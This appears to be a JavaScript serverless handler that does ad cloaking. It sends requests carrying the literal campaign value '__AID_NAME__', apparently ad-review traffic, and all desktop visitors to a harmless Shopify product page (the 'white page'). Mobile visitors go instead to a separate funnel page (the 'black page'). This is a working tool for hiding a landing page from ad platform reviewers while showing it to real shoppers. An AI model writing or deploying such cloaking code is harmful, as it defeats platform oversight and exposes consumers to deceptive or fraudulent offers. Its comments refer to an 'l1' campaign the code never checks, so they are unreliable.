export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://the-hub-clothing.myshopify.com/products/carhartt-womens-6-gilmore-waterproof-alloy-toe-work-hiker-fh5556";
    const blackPageURL = "https://elsyydkgie.myfunnelish.com/jj-dd-spr-1738364604529104-1738364997483090-1738675462192893-1738701512016734-1740065835936264";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
